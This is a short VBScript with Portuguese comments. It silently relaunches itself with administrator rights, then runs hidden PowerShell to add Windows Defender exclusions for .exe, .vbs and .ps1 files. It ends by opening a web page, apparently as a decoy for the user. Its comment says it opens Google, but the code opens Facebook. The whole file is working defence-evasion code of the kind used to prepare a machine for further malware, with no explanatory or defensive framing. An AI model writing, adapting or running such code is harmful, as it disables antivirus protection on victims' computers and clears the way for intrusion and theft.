Set WshShell = CreateObject("WScript.Shell")

' Elevação silenciosa para admin
If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
    WScript.Quit
End If

' Adicionar exclusões em modo oculto
WshShell.Run "powershell -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionExtension '.exe','.vbs','.ps1'""", 0, True

' Abrir Google normalmente
WshShell.Run "https://www.facebook.com/", 1, False